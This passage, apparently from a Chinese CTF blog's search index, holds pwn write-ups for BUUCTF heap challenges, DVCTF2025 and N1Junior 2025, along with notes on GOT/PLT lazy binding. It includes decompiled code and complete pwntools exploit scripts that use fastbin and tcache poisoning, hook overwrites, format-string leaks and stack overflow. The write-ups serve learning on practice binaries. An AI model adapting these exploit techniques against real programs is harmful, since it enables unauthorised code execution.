3, 34, -1, 0) != addr ) exit(-1); return \u0026addr[v3]; // 返回一个地址 } 随机找一个地址作为baby的基地址: baby： 00000000 struct baby // sizeof=0x18 00000000 { 00000000 __int64 inuse; 00000008 __int64 size; 00000010 char *content; 00000018 }; read_num函数没什么好说的 Allocate函数 分配一个baby，inuse位置1，分配我们填入的size大小的堆块，并把size填入baby-\u003esize，堆块的指针写入baby-\u003econtent 从baby0开始，根据Inuse位，有空插空，分配baby。 void __fastcall Allocate(baby *baby_addr) { int i; // [rsp+10h] [rbp-10h] int size; // [rsp+14h] [rbp-Ch] char *heap_addr; // [rsp+18h] [rbp-8h] for ( i = 0; i \u003c= 15; ++i ) { if ( !LODWORD(baby_addr[i].inuse) ) { printf(\"Size: \"); size = read_num(); if ( size \u003e 0 ) { if ( size \u003e 4096 ) // 最大分配 4096 size = 4096; heap_addr = (char *)calloc(size, 1u); // 会清零 if ( !heap_addr ) exit(-1); LODWORD(baby_addr[i].inuse) = 1; baby_addr[i].size = size; baby_addr[i].content = heap_addr; printf(\"Allocate Index %d\\n\", i); } return; } } } Fill函数 选择一个正在使用的baby，往它的content里读入大小为size的内容，这个size我们可以控制 __int64 __fastcall Fill(__int64 baby_addr) { __int64 result; // rax int index; // [rsp+18h] [rbp-8h] int size; // [rsp+1Ch] [rbp-4h] printf(\"Index: \"); result = read_num(); index = result; if ( (unsigned int)result \u003c 0x10 ) { result = *(unsigned int *)(24LL * (int)result + baby_addr); if ( (_DWORD)result == 1 ) { printf(\"Size: \"); result = read_num(); size = result; if ( (int)result \u003e 0 ) { printf(\"Content: \"); return read_content(*(_QWORD *)(24LL * index + baby_addr + 16), size); // 没限制读入多少 堆溢出 } } } return result; } 填充content，但是size是多少就往content里读入多少，存在溢出 read_content函数： unsigned __int64 __fastcall read_content(__int64 a1, unsigned __int64 a2) { unsigned __int64 v3; // [rsp+10h] [rbp-10h] ssize_t v4; // [rsp+18h] [rbp-8h] if ( !a2 ) return 0; v3 = 0; while ( v3 \u003c a2 ) { v4 = read(0, (void *)(v3 + a1), a2 - v3); if ( v4 \u003e 0 ) { v3 += v4; } else if ( *_errno_location() != 11 \u0026\u0026 *_errno_location() != 4 ) { return v3; } } return v3; } Free函数 选择一个正在使用的baby，把inuse，size位置0，free掉content，并把指针置0 __int64 __fastcall Free(baby *baby_addr) { __int64 result; // rax int index; // [rsp+1Ch] [rbp-4h] printf(\"Index: \"); result = read_num(); index = result; if ( (unsigned int)result \u003c 0x10 ) { result = LODWORD(baby_addr[(int)result].inuse); if ( (_DWORD)result == 1 ) { LODWORD(baby_addr[index].inuse) = 0; // flag置0 baby_addr[index].size = 0; // size置0 free(baby_addr[index].content); // free掉content result = (__int64)\u0026baby_addr[index]; *(_QWORD *)(result + 16) = 0; // 指针置0 } } return result; } Dump函数 选择一个正在使用的baby，根据这个baby的size，打印出size大小的content unsigned int __fastcall Dump(baby *baby_addr) { unsigned int index; // eax unsigned int v2; // [rsp+1Ch] [rbp-4h] printf(\"Index: \"); index = read_num(); v2 = index; if ( index \u003c 0x10 ) { index = baby_addr[index].inuse; if ( index == 1 ) { puts(\"Content: \"); write_content((__int64)baby_addr[v2].content, baby_addr[v2].size); return puts(byte_14F1); } } return index; } ","date":"2025-05-30","objectID":"/posts/buuctf_heap/:1:1","series":null,"tags":null,"title":"buuctf中刷过的一些堆题","uri":"/posts/buuctf_heap/#逆向分析"},{"categories":["WP"],"content":"\rpwn it总体思路是覆盖malloc_hook为one_gadget 首先需要泄露libc基地址 可以malloc一个small bin，然后free掉它，会进入unsorted bin，其fd和bk会指向main_arena+88，main_arena+88在libc中，可以计算偏移求出基地址。 但是free掉的baby，它的content指针会置空，inuse位置0，不能dump出来，所以我们需要另一个baby的content指针指向这个unsorted bin，之后dump这个新的baby 首先申请4个fastbin大小（0x20–0x80大小）的堆块，再free掉baby2、baby1 allocate(0x10) allocate(0x10) allocate(0x10) allocate(0x10) allocate(0x80) #small bin free(2) free(1) 再利用堆溢出，改babychunk2的fd的末尾字节为0x80，这样就指向了babychunk4 同时把babychunk4的size改为0x20 pl = b'a'*0x10 + p64(0) + p64(0x21) + p8(0x80) fill(0,len(pl),pl) pl = b'a'*0x10 + p64(0) + p64(0x21) fill(3,len(pl),pl) 再把申请两个大小为0x20的chunk，第二个chunk指向的是baby4（那个small bin） allocate(0x10) #baby1 allocate(0x10) #baby2 -\u003e small bin (babychunk4) 同时把baby4的size改回来 payload = b'a'*0x10 + p64(0) + p64(0x91) fill(3, len(payload), payload) 接着 allocate(0x80) free(4) dump(2) 申请一个堆块，让baby4不和top chunk 挨着，这样free(4)的时候，baby4才不会和top chunk合并，baby2指向baby4的chunk，dump2就会把baby4的content里的内容dump出来。 当一个堆块被释放时，如果它紧邻 top chunk，那么这个堆块会被直接合并到 top chunk 中，而不是放入任何 bin。 接着就是接收libc基地址，计算main_arena地址 p.recvuntil(b'Content:') p.recv(2) fd = u64(p.recv(6).ljust(8,b'\\x00')) success(\"fd -\u003e 0x%x\",fd) libc_base = fd - 0x7248910fab78 + 0x724890d36000 success(\"libc_base -\u003e 0x%x\",libc_base) main_arena_addr = libc_base + 0x3c4b20 下一步就是覆盖malloc_hook为onegadget 通过申请堆块到malloc_hook附近，然后覆盖 怎么申请堆块到malloc_hook附近？通过修改bin中的fd指针 先申请一个fastbin大小的堆块，然后free掉 allocate(0x60) #baby4 free(4) #baby4 Null 注意，我们之前让baby2 -\u003e babychunk4，可以通过fill(2)来设置babychunk4的fd，它的fd要设置在哪个具体位置？ malloc_hook附近有很多地址，可以让申请的arbitary chunk的size为0x7f 把堆块申请成这样： fake_chunk_addr = main_arena_addr - 0x33 fake_chunk_addr = p64(fake_chunk_addr) fill(2,len(fake_chunk_addr),fake_chunk_addr) 此时的bins: 接着申请两个大小为0x70的chunk，第二个chunk（babychunk6）就是申请到了malloc_hook附近 再计算偏移，往malloc_hook填入one_gadget 再去malloc一次，就能到one_gadget了 allocate(0x60) #baby4 allocate(0x60) #arbitary allocate baby6 one_gedget = libc_base + 0x4527a pl = b'a'*0x13 + p64(one_gedget) fill(6,len(pl),pl) allocate(0x100) ","date":"2025-05-30","objectID":"/posts/buuctf_heap/:1:2","series":null,"tags":null,"title":"buuctf中刷过的一些堆题","uri":"/posts/buuctf_heap/#pwn-it"},{"categories":["WP"],"content":"\rexp: from pwn import * context.terminal = [\"tmux\", \"splitw\", \"-h\"] context(os='linux',arch='amd64',log_level='debug') def dbg(): gdb.attach(p) # pause() address = './pwn' p = process(address) elf = ELF(address) libc = elf.libc # ip = \"\" # port = #p = remote(ip,port) def allocate(size): p.recvuntil(b'Command: ') p.sendline(b'1') p.recvuntil(b'Size: ') p.sendline(str(size)) def fill(index,size,content): p.recvuntil(b'Command: ') p.sendline(b'2') p.sendlineafter(b'Index: ',str(index)) p.sendlineafter(b'Size: ',str(size)) p.sendlineafter(b'Content: ',content) def free(index): p.recvuntil(b'Command: ') p.sendline(b'3') p.sendlineafter(b'Index: ',str(index)) def dump(index): p.recvuntil(b'Command: ') p.sendline(b'4') p.sendlineafter(b'Index: ',str(index)) allocate(0x10) #baby0 allocate(0x10) #baby1 allocate(0x10) #baby2 allocate(0x10) #baby3 allocate(0x80) #baby4 small bin free(2) free(1) pl = b'a'*0x10 + p64(0) + p64(0x21) + p8(0x80) fill(0,len(pl),pl) pl = b'a'*0x10 + p64(0) + p64(0x21) fill(3,len(pl),pl) allocate(0x10) #baby1 allocate(0x10) #baby2 -\u003e small bin (babychunk4) payload = b'a'*0x10 + p64(0) + p64(0x91) fill(3, len(payload), payload) allocate(0x80) #baby5 free(4) #baby4 NULL dump(2) p.recvuntil(b'Content:') p.recv(2) fd = u64(p.recv(6).ljust(8,b'\\x00')) success(\"fd -\u003e 0x%x\",fd) libc_base = fd - 0x7248910fab78 + 0x724890d36000 success(\"libc_base -\u003e 0x%x\",libc_base) main_arena_addr = libc_base + 0x3c4b20 allocate(0x60) #baby4 free(4) #baby4 Null fake_chunk_addr = main_arena_addr - 0x33 fake_chunk_addr = p64(fake_chunk_addr) fill(2,len(fake_chunk_addr),fake_chunk_addr) allocate(0x60) #baby4 allocate(0x60) #arbitary allocate baby6 one_gedget = libc_base + 0x4527a pl = b'a'*0x13 + p64(one_gedget) fill(6,len(pl),pl) allocate(0x100) p.interactive() 参考文章 https://bbs.kanxue.com/thread-268200.htm ","date":"2025-05-30","objectID":"/posts/buuctf_heap/:1:3","series":null,"tags":null,"title":"buuctf中刷过的一些堆题","uri":"/posts/buuctf_heap/#exp"},{"categories":["WP"],"content":"\rbuuctf_mergeheap off-by-one + tcache poisoning add：根据输入的大小size申请堆，可以往堆里写入size大小的数据，并把堆地址写入Chunk_array，size写进chunk_size数组（size的大小为4个字节） show：根据输入的idx，puts出堆块的内容 dele：根据输入的idx，free掉相应堆块，并把指针置空。chunk_size置空 merge：根据输入的idx1,idx2，把两个堆块合并起来，size加起来写入chunk_size数组，chunk_array同理。内容也合并 exit:退出 ","date":"2025-05-30","objectID":"/posts/buuctf_heap/:2:0","series":null,"tags":null,"title":"buuctf中刷过的一些堆题","uri":"/posts/buuctf_heap/#buuctf_mergeheap"},{"categories":["WP"],"content":"\r漏洞点在merge_heap的时候，用的是strcat，strcpy strcpy字符串复制 char *strcpy(char *dest, const char *src); 行为： 复制src到dest，包括NULL终止符 不检查缓冲区大小 strcat字符串拼接 char *strcat(char *dest, const char *src); 行为： 将src追加到dest末尾 依赖dest的NULL终止符找到结尾 存在off-by-one 当我们将idx1和2进行合并的时候，idx2的size域0x21会被strcpy看作src的一部分，从而会导致idx2的最后一个字节off-by-two（还有一个strcat的NULL终止符） ","date":"2025-05-30","objectID":"/posts/buuctf_heap/:2:1","series":null,"tags":null,"title":"buuctf中刷过的一些堆题","uri":"/posts/buuctf_heap/#漏洞点"},{"categories":["WP"],"content":"\r漏洞点在merge_heap的时候，用的是strcat，strcpy strcpy字符串复制 char *strcpy(char *dest, const char *src); 行为： 复制src到dest，包括NULL终止符 不检查缓冲区大小 strcat字符串拼接 char *strcat(char *dest, const char *src); 行为： 将src追加到dest末尾 依赖dest的NULL终止符找到结尾 存在off-by-one 当我们将idx1和2进行合并的时候，idx2的size域0x21会被strcpy看作src的一部分，从而会导致idx2的最后一个字节off-by-two（还有一个strcat的NULL终止符） ","date":"2025-05-30","objectID":"/posts/buuctf_heap/:2:1","series":null,"tags":null,"title":"buuctf中刷过的一些堆题","uri":"/posts/buuctf_heap/#strcpy"},{"categories":["WP"],"content":"\r漏洞点在merge_heap的时候，用的是strcat，strcpy strcpy字符串复制 char *strcpy(char *dest, const char *src); 行为： 复制src到dest，包括NULL终止符 不检查缓冲区大小 strcat字符串拼接 char *strcat(char *dest, const char *src); 行为： 将src追加到dest末尾 依赖dest的NULL终止符找到结尾 存在off-by-one 当我们将idx1和2进行合并的时候，idx2的size域0x21会被strcpy看作src的一部分，从而会导致idx2的最后一个字节off-by-two（还有一个strcat的NULL终止符） ","date":"2025-05-30","objectID":"/posts/buuctf_heap/:2:1","series":null,"tags":null,"title":"buuctf中刷过的一些堆题","uri":"/posts/buuctf_heap/#strcat"},{"categories":["WP"],"content":"\r思路 填满tcache bin 泄露libc，通过off-by-one去改大下一个堆块的size，free掉，进入unsorted bin，通过chunk overlapping 通过tcache poisoning，分配堆块到free_hook，劫持为system，再free掉内容为binsh的堆块 在通过exp的方法泄露出libc之后才想到：可以通过填满tcache，再申请一个大于fastbin的堆块，free掉它，就会进入unsorted bin，然后申请出来，show它就可以泄露libc。exp中的方法好像复杂了 ","date":"2025-05-30","objectID":"/posts/buuctf_heap/:2:2","series":null,"tags":null,"title":"buuctf中刷过的一些堆题","uri":"/posts/buuctf_heap/#思路"},{"categories":["WP"],"content":"\rexp #hwb_2019_mergeheap from pwn import * context.terminal = [\"tmux\", \"splitw\", \"-h\"] context(os='linux',arch='amd64',log_level='debug') def dbg(): gdb.attach(p) pause() address = './pwn' # p = process(address) elf = ELF(address) libc = elf.libc ip = \"node5.buuoj.cn\" port = 28721 p = remote(ip,port) def cmd(idx): p.recvuntil(b'\u003e\u003e') p.sendline(str(idx)) def add(size,content): cmd(1) p.sendlineafter(b'len:',str(size)) p.sendlineafter(b'content:',content) def show(idx): cmd(2) p.sendlineafter(b'idx:',str(idx)) def dele(idx): cmd(3) p.sendlineafter(b'idx:',str(idx)) def merge(idx1,idx2): cmd(4) p.sendlineafter(b'idx1:',str(idx1)) p.sendlineafter(b'idx2:',str(idx2)) # 首先泄露libc 等下把下面这个0x31改成0x41就可以泄露libc pl = b'a'*0xf + p8(0x41) #这个是first_3的size add(0x10,pl) #0 pl = b'b'*0x18 add(0x18,pl) #1 add(0x28,b'c'*4) #2 add(0x28,b'd'*4) #first_3 dele(2) merge(1,0) #2 #这样就把3的大小改了 dele(3) add(128,b'e'*4) #second_3 # 填满128的tcache for i in range(7): add(0x80,b'tcache') #这个堆块用于防止consolidate add(0x10,b'zhanwei') #11 for j in range(4,11): dele(j) dele(3) #进入unsorted add(0x30,b'a'*0x30) #3 show(3) p.recvuntil(b'a'*0x30) libc_addr = u64(p.recv(6).ljust(8,b'\\x00')) - 0x3ebca0 success(\"libc_addr = 0x%x\",libc_addr) #这里把破坏的堆结构改回来,不然接下来申请堆块的时候会报错 dele(3) #这个chunk大小为0x41 pl = b'a'*0x20 + p64(0) + p64(0x91) add(0x30,pl) #3 #然后把tcahce中的堆块申请出来 for i in range(7): add(0x80,b'f'*4) # 4-10 # #申请出来unsorted中的堆块 add(0x80,b'f'*4) #12 #再把tcache的free回去 for j in range(4,11): dele(j) #现在4-10为空 free_hook = libc_addr + libc.symbols['__free_hook'] system_addr = libc.symbols['system'] + libc_addr pl = b'1'*0xf + p8(0xa0) #这个是first_3的size add(0x10,pl) #0 4 pl = b'2'*0x18 add(0x18,pl) #1 5 add(0x28,b'merge_chunk')#2 6 add(0x20,b'size be writed chunk') #3 7 dele(6) merge(5,4) #2 #size be writed dele(7) #size 0x50 add(0x10,b'tcache')#3 7 dele(7) pl = b'x'*0x20 + p64(0) + p64(0x21) + p64(free_hook) + p64(free_hook) add(0x90,pl) #3 7 add(0x10,b'/bin/sh\\x00')#4 8 pl = p64(system_addr) add(0x10,pl) #5 9 dele(8) p.interactive() 不知道为啥远程不通 ","date":"2025-05-30","objectID":"/posts/buuctf_heap/:2:3","series":null,"tags":null,"title":"buuctf中刷过的一些堆题","uri":"/posts/buuctf_heap/#exp-1"},{"categories":["WP"],"content":"格式化字符串漏洞+栈溢出 ","date":"2025-05-26","objectID":"/posts/dvctf2025/:0:0","series":null,"tags":null,"title":"DVCTF2025","uri":"/posts/dvctf2025/#"},{"categories":["WP"],"content":"\rDVCTF Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled ","date":"2025-05-26","objectID":"/posts/dvctf2025/:0:0","series":null,"tags":null,"title":"DVCTF2025","uri":"/posts/dvctf2025/#dvctf"},{"categories":["WP"],"content":"\r逆向分析 int __fastcall main(int argc, const char **argv, const char **envp) { int v4; // [rsp+Ch] [rbp-44h] BYREF char v5[56]; // [rsp+10h] [rbp-40h] BYREF unsigned __int64 v6; // [rsp+48h] [rbp-8h] v6 = __readfsqword(0x28u); puts(asc_2190); puts(\u0026byte_2228); puts(\u0026byte_22C0); puts(\u0026byte_2358); puts(\u0026byte_23F0); puts(\u0026byte_2488); puts(\u0026byte_2520); puts(\u0026byte_25B8); puts(\u0026byte_2650); puts(\u0026byte_26E8); puts(\u0026byte_2780); puts(\u0026byte_2818); puts(\u0026byte_28B0); puts(\u0026byte_2948); puts(\u0026byte_29E0); puts(\u0026byte_2A78); puts(\u0026byte_2B10); puts(\u0026byte_2BA8); puts(\u0026byte_2C40); puts(\u0026byte_2CD8); puts(\u0026byte_2D70); puts(\u0026byte_2E08); puts(\u0026byte_2EA0); puts(\u0026byte_2F38); puts(\u0026byte_2FD0); puts(\u0026byte_3068); puts(\u0026byte_3100); puts(\u0026byte_3198); puts(\u0026byte_3230); puts(\u0026byte_32C8); puts(\"Enter your name : \"); __isoc99_scanf(\" %[^\\n]\", v5); printf(\"\\n Hey %s \", v5); puts(\" ! Welcome to the Louvre software !\"); do { displayMenu(); __isoc99_scanf(\"%d\", \u0026v4); if ( v4 == 4 ) { QuitProgram(v5); } else { if ( v4 \u003c= 4 ) { switch ( v4 ) { case 3: VisitRoom(); continue; case 1: CheckIdentity(v5); continue; case 2: CheckVersion(); continue; } } puts(\"\\n Invalid choice. \"); } } while ( v4 != 4 ); return 0; } CheckIdentity中存在格式化字符串漏洞 int __fastcall CheckIdentity(const char *a1) { puts(\"Your identity is : \"); return printf(a1); } VisitRoom中存在栈溢出漏洞 __int64 VisitRoom() { unsigned int v1; // [rsp+8h] [rbp-18h] BYREF char v2[10]; // [rsp+Eh] [rbp-12h] BYREF unsigned __int64 v3; // [rsp+18h] [rbp-8h] v3 = __readfsqword(0x28u); puts(\"How many rooms do you want to visit? ( 0-99 )\"); __isoc99_scanf(\"%2d\", \u0026v1); if ( v1 \u003c= 0x1388 ) { printf(\"\\nYou have chosen to request a visit %d rooms.\\n\", v1); } else { puts(\"That's a lot, isn't it?!\"); puts(\"Who are the tickets for?\"); __isoc99_scanf(\"%s\", v2); printf(\"Tickets will be sent to: %s\\n\", v2); } return 0; } 存在输出flag的函数 void readflag() { char v0; // [rsp+7h] [rbp-9h] FILE *stream; // [rsp+8h] [rbp-8h] stream = fopen(\"flag.txt\", \"r\"); if ( stream ) { while ( 1 ) { v0 = fgetc(stream); if ( v0 == -1 ) break; putchar(v0); } fclose(stream); } else { perror(\"Failed to open file\"); } } ","date":"2025-05-26","objectID":"/posts/dvctf2025/:1:0","series":null,"tags":null,"title":"DVCTF2025","uri":"/posts/dvctf2025/#逆向分析"},{"categories":["WP"],"content":"\r思路通过格式化字符串漏洞，泄露栈上的canary和程序基地址。通过栈溢出，修改返回地址 ","date":"2025-05-26","objectID":"/posts/dvctf2025/:2:0","series":null,"tags":null,"title":"DVCTF2025","uri":"/posts/dvctf2025/#思路"},{"categories":["WP"],"content":"\rexp from pwn import * context.terminal = [\"tmux\", \"splitw\", \"-h\"] context(os='linux',arch='amd64',log_level='debug') def dbg(): gdb.attach(p) # pause() address = './pwn' p = process(address) elf = ELF(address) libc = elf.libc # ip = \"\" # port = #p = remote(ip,port) backdoor = 0x1296 p.recvuntil(b'name : \\n') pl = b'%19$p|%9$p' p.sendline(pl) # dbg() p.sendline(b'1') p.recvuntil(b'identity is : \\n') canary = int(p.recv(18),16) success(\"canary ---\u003e 0x%x\",canary) p.recvuntil(b'|') base_addr = int(p.recv(14),16) base_addr = base_addr - 0x5619fcb116fb + 0x5619fcb10000 success(\"base_addr ---\u003e 0x%x\",base_addr) p.sendline(b'3') p.sendline(b'-1') p.recvuntil(b'for?\\n') pl = b'a'*10 + p64(canary) pl+= p64(0) + p64(base_addr + backdoor) p.sendline(pl) p.interactive() ","date":"2025-05-26","objectID":"/posts/dvctf2025/:3:0","series":null,"tags":null,"title":"DVCTF2025","uri":"/posts/dvctf2025/#exp"},{"categories":["WP"],"content":"\r知识点scanf(\"%s\") 的行为： %s 会读取输入直到遇到 空白字符（空格、换行、制表符等），不会因 \\x00 终止。 输入数据中的 \\x00 会被视为普通字符，继续写入内存。 （。。。当时打的时候还以为canary的\\x00会截断scanf的%s） ","date":"2025-05-26","objectID":"/posts/dvctf2025/:4:0","series":null,"tags":null,"title":"DVCTF2025","uri":"/posts/dvctf2025/#知识点"},{"categories":["pwn"],"content":"延迟绑定过程分析 ","date":"2025-03-24","objectID":"/posts/lazy_binding/:0:0","series":null,"tags":null,"title":"延迟绑定过程分析","uri":"/posts/lazy_binding/#"},{"categories":["pwn"],"content":"\rGOT\u0026PLTgot表和plt表都是程序调用外部函数时，定位该函数需要使用到的表 ","date":"2025-03-24","objectID":"/posts/lazy_binding/:0:0","series":null,"tags":null,"title":"延迟绑定过程分析","uri":"/posts/lazy_binding/#gotplt"},{"categories":["pwn"],"content":"\rGlobal Offset Table(GOT，全局偏移表)GOT 表的主要功能是 存储动态链接库（如 libc.so）中函数和全局变量的运行时地址。 GOT表包括两种类型.got和.got.plt .got 存储 全局变量 的地址 .got.plt 存储 动态库函数 的地址（如 printf、read）。 与 PLT（Procedure Linkage Table） 配合实现 延迟绑定（Lazy Binding）。 ","date":"2025-03-24","objectID":"/posts/lazy_binding/:1:0","series":null,"tags":null,"title":"延迟绑定过程分析","uri":"/posts/lazy_binding/#global-offset-tablegot全局偏移表"},{"categories":["pwn"],"content":"\r.got.plt的公共表项有三个公共表项，分别是 got[0]:_DYNAMIC:指向 动态段（.dynamic） 的地址 got[1]:link_map 指针:动态链接器内部使用的 link_map 结构指针（用于符号解析） got[2]:_dl_runtime_resolve:动态解析函数的地址 got[3]开始就是函数的地址 示例：x86-64 的 .got.plt 布局 .got.plt:0000000000403FE8 .got.plt:0000000000403FE8 ; Segment type: Pure data .got.plt:0000000000403FE8 ; Segment permissions: Read/Write .got.plt:0000000000403FE8 _got_plt segment qword public 'DATA' use64 .got.plt:0000000000403FE8 assume cs:_got_plt .got.plt:0000000000403FE8 ;org 403FE8h .got.plt:0000000000403FE8 _GLOBAL_OFFSET_TABLE_ dq offset _DYNAMIC .got.plt:0000000000403FF0 qword_403FF0 dq 0 ; DATA XREF: sub_401020↑r .got.plt:0000000000403FF8 qword_403FF8 dq 0 ; DATA XREF: sub_401020+6↑r .got.plt:0000000000404000 off_404000 dq offset seccomp_init ; DATA XREF: _seccomp_init+4↑r .got.plt:0000000000404008 off_404008 dq offset seccomp_rule_add .got.plt:0000000000404008 ; DATA XREF: _seccomp_rule_add+4↑r .got.plt:0000000000404010 off_404010 dq offset write ; DATA XREF: _write+4↑r .got.plt:0000000000404018 off_404018 dq offset seccomp_load ; DATA XREF: _seccomp_load+4↑r .got.plt:0000000000404020 off_404020 dq offset setbuf ; DATA XREF: _setbuf+4↑r .got.plt:0000000000404028 off_404028 dq offset close ; DATA XREF: _close+4↑r .got.plt:0000000000404030 off_404030 dq offset read ; DATA XREF: _read+4↑r .got.plt:0000000000404030 _got_plt ends .got.plt:0000000000404030 其中 .got.plt:0000000000403FE8 _GLOBAL_OFFSET_TABLE_ dq offset _DYNAMIC .got.plt:0000000000403FF0 qword_403FF0 dq 0 ; DATA XREF: sub_401020↑r .got.plt:0000000000403FF8 qword_403FF8 dq 0 ; DATA XREF: sub_401020+6↑r 就是公共表项，从上到下依次就是got[0]、got[1]、got[2] got[1]、got[2]由动态链接器在装载共享模块的时候负责将它们初始化 ","date":"2025-03-24","objectID":"/posts/lazy_binding/:1:1","series":null,"tags":null,"title":"延迟绑定过程分析","uri":"/posts/lazy_binding/#gotplt的公共表项"},{"categories":["pwn"],"content":"\rlink_map数据结构的定义如下： struct link_map { /* Shared library's load address. */ ElfW(Addr) l_addr; /* Pointer to library's name in the string table. */ char *l_name; /* Dynamic section of the shared object. Includes dynamic linking info etc. Not interesting to us. */ ElfW(Dyn) *l_ld; /* Pointer to previous and next link_map node. */ struct link_map *l_next, *l_prev; }; 首次调用动态函数时，_dl_runtime_resolve 通过 link_map 解析符号地址。 ","date":"2025-03-24","objectID":"/posts/lazy_binding/:1:2","series":null,"tags":null,"title":"延迟绑定过程分析","uri":"/posts/lazy_binding/#link_map"},{"categories":["pwn"],"content":"\rProcedure Linkage Table(PLT,进程链接表)结构： PLT0（公共解析逻辑） 所有 PLT 条目共享的代码，负责调用 _dl_runtime_resolve 解析函数地址。 PLT1, PLT2, …（函数专用条目） 每个动态函数（如 printf、read）有一个 PLT 条目。 典型 PLT 条目（x86-64） printf@plt: jmp *GOT[n] ; 首次调用时，GOT[n] 指向下一行（解析逻辑） push 5 ; 符号索引（5 = printf 在 .dynsym 中的下标） jmp PLT0 ; 跳转到公共解析逻辑（_dl_runtime_resolve） ","date":"2025-03-24","objectID":"/posts/lazy_binding/:2:0","series":null,"tags":null,"title":"延迟绑定过程分析","uri":"/posts/lazy_binding/#procedure-linkage-tableplt进程链接表"},{"categories":["pwn"],"content":"\r延迟绑定过程函数第一次调用时，过程如下图： 跳转到该函数的PLT条目 第一个jmp指令跳往对应函数的.got.plt入口，但是这个时候got表中还没有填充函数的真实地址。 所以从got表跳回到plt表中，继续往下执行push;jmp。跳回后，push的值是对应函数在**.got.plt**入口的偏移 跳到PLT头部，执行push指令，将 GOT[1] 的地址（link_map的地址）入栈。 接着jmp到 **GOT[2] ** 即dl_runtime_resolve相关的函数对动态函数进行地址解析和重定位 并且把函数真实地址回填到got表中 最后执行函数 非首次调用，过程如下图： 之后再调用该函数的时候，plt只有一个跳转指令，找到对应的函数地址之后执行函数。动态调试看了一个整个运行过程，有了一个更深入的的理解。 跳转到该函数的PLT条目 第一个jmp指令跳往对应函数的.got.plt入口 此时的got表被填充为函数的真实地址，跳转到真实地址 执行函数 ","date":"2025-03-24","objectID":"/posts/lazy_binding/:0:0","series":null,"tags":null,"title":"延迟绑定过程分析","uri":"/posts/lazy_binding/#延迟绑定过程"},{"categories":["pwn"],"content":"\r实际分析这里用gdb动态调试，实际分析一下 ","date":"2025-03-24","objectID":"/posts/lazy_binding/:0:0","series":null,"tags":null,"title":"延迟绑定过程分析","uri":"/posts/lazy_binding/#实际分析"},{"categories":["pwn"],"content":"\r第一次调用过程： 首先函数call了0x401100，0x401100就是read函数的.plt.sec 接着step步入 可以看到，实际上，程序会先进入.plt.sec执行jmp，再到.plt中执行push;jmp。 可以看到这时read函数的.got.plt还没被更改为真实地址，而是指向read函数PLT表项中的push 执行完dl_runtime_resolve相关的函数，就会进入read的真实地址执行read，同时可以看到，read函数的.got.plt也指向的该函数真实地址 接着就执行read函数 ","date":"2025-03-24","objectID":"/posts/lazy_binding/:1:0","series":null,"tags":null,"title":"延迟绑定过程分析","uri":"/posts/lazy_binding/#第一次调用过程"},{"categories":["pwn"],"content":"\r非首次调用过程： 先call了read函数的.plt.sec 然后s步入 qword ptr [rip + 0x2f26]就是取出存储在read的.got.plt中地址，然后跳转到该地址 指令 行为 jmp 0x404040 直接跳转到 0x404040（绝对地址） jmp [0x403f2c] 从 0x403f2c 读取 8 字节作为目标地址 jmp qword ptr [rip + 0x2f26] 从 (RIP + 0x2f26) 读取 8 字节作为目标地址（动态计算） 然后直接执行read 所以，非首次调用，got表中存储的就是真实地址 ","date":"2025-03-24","objectID":"/posts/lazy_binding/:2:0","series":null,"tags":null,"title":"延迟绑定过程分析","uri":"/posts/lazy_binding/#非首次调用过程"},{"categories":["pwn"],"content":"\r参考文献延迟绑定过程分析：理论分析 深入理解plt表、got表和动态链接：前置知识 延迟绑定过程图 ","date":"2025-03-24","objectID":"/posts/lazy_binding/:0:0","series":null,"tags":null,"title":"延迟绑定过程分析","uri":"/posts/lazy_binding/#参考文献"},{"categories":["WP"],"content":"N1Junior_2025 Pwn复现 ","date":"2025-03-12","objectID":"/posts/n1junior2025/:0:0","series":null,"tags":null,"title":"N1Junior_2025 Pwn","uri":"/posts/n1junior2025/#"},{"categories":["WP"],"content":"\rRemake涉及知识点：.fini_array Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled SHSTK: Enabled IBT: Enabled __int64 __fastcall main(__int64 a1, char **a2, char **a3) { sub_11A9(); read(0, format, 0x10u); printf(format); if ( dword_4060 ) //刚开始 dword_4060 = 0 sub_120E(); else dword_4060 = 1; return 0; } unsigned __int64 sub_120E() { char buf[16]; // [rsp+0h] [rbp-1010h] BYREF unsigned __int64 v2; // [rsp+1008h] [rbp-8h] v2 = __readfsqword(0x28u); read(0, buf, 0x300u); printf(buf); return v2 - __readfsqword(0x28u); } 看到程序，很容易联想到修改.fini_array来重新执行main函数（这样dword_4060就会等于1，进入sub_120E函数） 接下来就是利用格式化字符串漏洞printf(format);，来修改.fini_array .fini_array下面就是main函数的地址(出题人的gift) 程序开了PIE，程序基地址+0x3da0为.fini_array地址，我们可以通过程序基地址+8+0x3da0这样就能修改程序返回地址为main函数地址 printf是栈中指向程序基地址的地址位于动态连接器，可能为struct link_map中的l_addr(程序基地址) 因为.fini_array 的实际地址 = l_addr + .fini_array 的偏移地址 所以这里我们让l_addr+8 同时，通过栈中main函数的地址减去偏移，就能得到PIE基地址 这时exp: from pwn import * context(os='linux',arch='amd64',log_level='debug') def dbg(): gdb.attach(p) pause() address = './remake' p = process(address) # elf = ELF(address) # libc = ELF.libc # ip = \"\" # port = #p = remote(ip,port) #----------------------------------------------------------------- s = lambda data :p.send(data) ss = lambda data :p.send(str(data)) sa = lambda delim,data :p.sendafter(str(delim), str(data)) sl = lambda data :p.sendline(data) sls = lambda data :p.sendline(str(data)) sla = lambda delim,data :p.sendlineafter(str(delim), str(data)) r = lambda num :p.recv(num) ru = lambda delims, drop=True :p.recvuntil(delims, drop) itr = lambda :p.interactive() uu32 = lambda data :u32(data.ljust(4,b'\\x00')) uu64 = lambda data :u64(data.ljust(8,b'\\x00')) leak = lambda name,addr :log.success('{} = {:#x}'.format(name, addr)) l64 = lambda :u64(p.recvuntil(\"\\x7f\")[-6:].ljust(8,b\"\\x00\")) l32 = lambda :u32(p.recvuntil(\"\\xf7\")[-4:].ljust(4,b\"\\x00\")) #----------------------------------------------------------------- pl = b'%8c%30$hhn%9$p' # dbg() sl(pl) ru(b\"0x\") pie = int(r(16),16) - 0x1279 success(\"pie = 0x%x\",pie) 发送payload之后，再dbg，在重新执行时，查看printf时的栈情况 再在栈中寻找stack地址和libc地址，再通过覆盖返回地址为one_gadget，实现getshell 最终exp: from pwn import * context(os='linux',arch='amd64',log_level='debug') def dbg(): gdb.attach(p) pause() address = './remake' p = process(address) elf = ELF(address) libc = ELF(\"./libc.so.6\") # ip = \"\" # port = #p = remote(ip,port) 